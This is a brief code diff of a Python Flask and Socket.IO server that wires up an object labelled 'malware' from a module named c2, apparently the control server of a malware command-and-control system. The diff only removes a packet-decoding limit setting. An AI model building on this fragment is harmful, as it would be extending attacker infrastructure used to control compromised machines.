@@ -3,9 +3,8 @@ import eventlet
 import socketio
 from c2 import C2
 import os
-from engineio.payload import Payload
 
-Payload.max_decode_packets = 50
+
 app = Flask(__name__)
 sio = socketio.Server(cors_allowed_origins='*', logger=False)
 malware = C2(sio)
